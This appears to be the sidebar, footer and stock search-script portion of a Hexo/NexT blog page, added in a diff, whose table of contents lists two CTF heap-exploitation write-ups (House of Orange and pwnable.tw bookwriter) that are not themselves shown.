+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/n0va.jpg" alt="R4bb1t">
+            
+              <p class="site-author-name" itemprop="name">R4bb1t</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-orange-–-2016Hitcon-CTF"><span class="nav-number">1.</span> <span class="nav-text">House_of_orange – 2016Hitcon CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">程序漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bookwriter-–-pwnable-tw"><span class="nav-number">2.</span> <span class="nav-text">bookwriter – pwnable.tw</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞点"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01"><span class="nav-number">2.1.1.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02"><span class="nav-number">2.1.2.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03"><span class="nav-number">2.1.3.</span> <span class="nav-text">0x03</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">R4bb1t</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
